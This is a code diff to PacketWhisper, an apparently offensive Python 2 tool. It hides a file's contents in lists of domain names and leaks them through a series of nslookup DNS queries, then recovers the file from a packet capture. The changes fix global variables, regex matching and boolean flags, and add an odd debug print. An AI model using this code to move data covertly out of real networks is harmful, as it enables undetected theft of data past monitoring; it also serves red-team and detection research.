@@ -113,6 +113,7 @@ gSubdomainRandomizerScripts.sort()
 def CloakAndTransferFile():
 
 	# Reset this each time we pass through
+	global gCommonFQDNCipherSelected 
 	gCommonFQDNCipherSelected = False
 
 	# Perform payload selection, cipher selection, Cloakify the payload into FQDNs
@@ -423,7 +424,7 @@ def SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile ):
 	print "Adding subdomain randomization to cloaked file using :" + scriptFilename
 
 	try:
-		os.system( "ciphers/subdomain_randomizer_scripts/%s %s" % ( scriptFilename, cloakedFile ))
+		os.system( "python ciphers/subdomain_randomizer_scripts/%s %s" % ( scriptFilename, cloakedFile ))
 
 	except:
 		print ""
@@ -510,6 +511,8 @@ def SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile ):
 #========================================================================
 
 def SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile ):
+	
+	global gCommonFQDNCipherSelected
 
 	cipherNum = SelectCipher( gCommonFQDNCipherFiles )
 
@@ -588,9 +591,6 @@ def GenerateDNSQueries( cloakedFile, queryDelay ):
 
 			fqdnStr = fqdn.strip()
 			
-			# Debug
-			# print fqdnStr
-
 			try:
 				commandStr = "nslookup " + fqdnStr + " >/dev/null 2>&1"
 				os.system( commandStr )
@@ -706,16 +706,20 @@ def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag,
 
 	for dnsQuery in queries:
 
-		# DEBUG
-		#print dnsQuery,
-
 		for cipherElement in cipherStrings:
 
 			# We're matching on any "A?" DNS queries that also contain the cipher element
 
-			found = re.search(r"A\? " + cipherElement + "?", dnsQuery)
-			
-			if found:
+			foundQuery1 = re.search(r"A\? " + cipherElement + "?", dnsQuery)
+
+			# For Repeated cipher family, we add a tag as the first element of the FQDN
+			# to identify duplicate requests. This search catches those.
+
+			if not foundQuery1:
+
+				foundQuery2 = re.search(r"A\?\s*.+\." + cipherElement + "?", dnsQuery)
+
+			if foundQuery1 or foundQuery2:
 
 				# Now match those hits to DNS queries that also contain the cipher 
 				# tag. This may seem redundant to the re.search() above, but since
@@ -731,9 +735,6 @@ def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag,
 					# positives. Add the cipher element to the extracted cloaked 
 					# file that we'll later pass to Decloakify()
 
-					# DEBUG
-					#print cipherElement,
-
 					queryElements = dnsQuery.split()	
 					fqdnElements = queryElements[ 7 ].split( '.' )
 					subdomain = fqdnElements[ 0 ]
@@ -745,11 +746,10 @@ def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag,
 						cloakedFile.write( cipherElement )
 
 					elif not isRandomized:
-			
+		
 						cloakedFile.write( cipherElement )
 
 					previousSubdomain = subdomain
-
 
 	queriesFile.close()
 	cipherFile.close()
@@ -778,7 +778,7 @@ def ExtractCapturedPayload():
 	cloudfrontStr = "cloudfront.net"
 	akstatStr = "akstat.io"
 	optimizelyStr = "optimizely.com"
-	commonFQDNStr = "common"
+	commonFQDNStr = "www"
 
 	pcapTextFilename = "tempPcapFile.txt"
 
@@ -826,7 +826,7 @@ def ExtractCapturedPayload():
 	# FQDNs in the PCAP file. This is a really simple way of identifying and 
 	# skipping duplicate DNS queries
 
-	isRandomized = "True"
+	isRandomized = True
 
 	# For Random Subdomain FQDN ciphers, use the base domain name as extra filter
 	# For Common FQDN ciphers, use the IP address that sent the knock sequence
@@ -842,7 +842,7 @@ def ExtractCapturedPayload():
 
 	elif ( commonFQDNStr in cipherFilePath ):
 		cipherTag = commonFQDNStr
-		isRandomized = "False"
+		isRandomized = False
 
 
 	# If it's a Common FQDN cipher, we have to use the embedded knock sequence
@@ -851,6 +851,9 @@ def ExtractCapturedPayload():
 	# knock sequence in pcap.
 
 	if ( cipherTag == commonFQDNStr ):
+
+		# DEBUG
+		print ### Common cipher branch
 
 		cipherTag = GetSourceIPViaKnockSequence( dnsQueriesFilename )
 
@@ -1178,7 +1181,7 @@ def Help():
 	print "which are UDP-based, meaning order of delivery (or even successful delivery)"
 	print "of the request is not guranteed. For this reason, PacketWhisper by default"
 	print "adds a small (half-second) delay between each DNS query. This will safely"
-	print "transfer payloads at a rate of about 7.2K per hour (120 bytes per minute),"
+	print "transfer payloads at a rate of about 7.2K per hour (120 bytes per minute)"
 	print "based on the size of the original payload, not the Cloakified output file."
 	print ""
 	print "You can opt for no delay between between queries, which dramatically speeds"
